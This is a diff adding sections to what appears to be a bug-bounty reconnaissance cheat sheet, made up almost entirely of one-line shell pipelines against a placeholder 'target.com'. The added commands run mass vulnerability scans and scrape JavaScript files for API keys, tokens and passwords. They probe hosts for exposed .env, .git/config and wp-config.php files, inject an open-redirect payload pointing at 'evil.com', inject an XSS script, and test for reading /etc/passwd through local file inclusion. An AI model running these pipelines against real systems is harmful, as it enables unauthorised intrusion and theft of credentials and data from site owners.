@@ -531,3 +531,74 @@ To check for CORS misconfigurations:
 ```bash
 cat urls.txt | corscanner
 ```
+
+### Scan for Open Admin Panels (Exposed Panels)
+```bash
+cat urls.txt | nuclei -silent -t exposed-panels/
+```
+
+### Bonus: ALL-IN-ONE MEGA SCAN 💣 (Subdomain + Alive + CVE Scan + Panels)
+```bash
+subfinder -d target.com | httpx -silent -mc 200 | tee alive.txt | nuclei -silent -t cves/,exposed-panels/
+```
+
+### All-in-One Recon Pipeline (Subdomains → Probing → Ports → Tech Detection → Titles)
+```bash
+subfinder -d target.com | anew subs.txt && cat subs.txt | httpx -silent -title -tech-detect -ports 80,443,8080,8443 | anew alive.txt
+```
+
+### Mass Fetch JS Files + Find Secrets + Endpoints + Tokens
+```bash
+cat alive.txt | hakrawler -subs | grep '\.js$' | anew jsfiles.txt && cat jsfiles.txt | xargs -I{} bash -c 'curl -s {} | tr -d "\r" | egrep -i "(api|key|token|secret|password|passwd|authorization|bearer|client_id|client_secret)"' | tee secrets.txt
+```
+
+### Check for Open Redirects Across All Params (with Payload Injection)
+```bash
+cat alive.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -fr 'evil.com' -mc 302,301
+```
+
+### Automatic Vulnerability Scan (Subdomains to CVE Detection + Misconfigs)
+```bash
+subfinder -d target.com | httpx -silent | nuclei -silent -t cves/,misconfiguration/
+```
+
+### Backup Files Bruteforce Across All Hosts
+```bash
+cat alive.txt | httpx -silent -path-list <(echo -e "/.git/config\n/.env\n/database.sql\n/backup.zip\n/config.php\n/wp-config.php") -mc 200 | tee backups.txt
+```
+
+### Check for Parameter-Based XSS (Direct Injection Testing)
+```bash
+cat alive.txt | hakrawler -subs -depth 2 | gf xss | qsreplace '"><script>alert(document.domain)</script>' | httpx -silent -fr 'alert(document.domain)'
+```
+
+### Automated LFI Discovery (Common Payloads)
+```bash
+cat alive.txt | gf lfi | qsreplace '../../../../../../etc/passwd' | httpx -silent -mc 200
+```
+
+### Fuzz Parameters & Check Reflections (for XSS & Injection Discovery)
+```bash
+cat alive.txt | waybackurls | gf params | uro | qsreplace FUZZ | ffuf -u FUZZ -w wordlists/payloads/xss.txt -fr 'FUZZ'
+```
+
+### Subdomain Takeover Detection (Live Scan + Detection)
+```bash
+subfinder -d target.com | httpx -silent | nuclei -silent -t takeovers/
+```
+
+### Full Asset Discovery + Technology Analysis + Title Collection
+```bash
+assetfinder --subs-only target.com | httpx -silent -title -tech-detect | tee assets_with_tech.txt
+```
+
+### Mega Pipeline - Subdomains → URLs → Parameters → XSS/SQL/Secrets
+```bash
+subfinder -d target.com | anew subs.txt && cat subs.txt | httpx -silent | hakrawler -subs -depth 2 | anew urls.txt && cat urls.txt | gf xss | dalfox pipe --skip-bav --only-poc | tee xss_poc.txt && cat urls.txt | grep '\.js$' | xargs -I{} bash -c 'curl -s {} | egrep -i "(api|key|token|secret|password|passwd|auth)"' | tee secrets.txt
+```
+
+### Ultimate Recon Monster (Subdomains → Probing → Ports → Technologies → CVEs)
+```bash
+subfinder -d target.com | httpx -silent -title -tech-detect -ports 80,443,8080,8443 | tee tech_scan.txt && cat tech_scan.txt | nuclei -silent -t cves/
+```
+
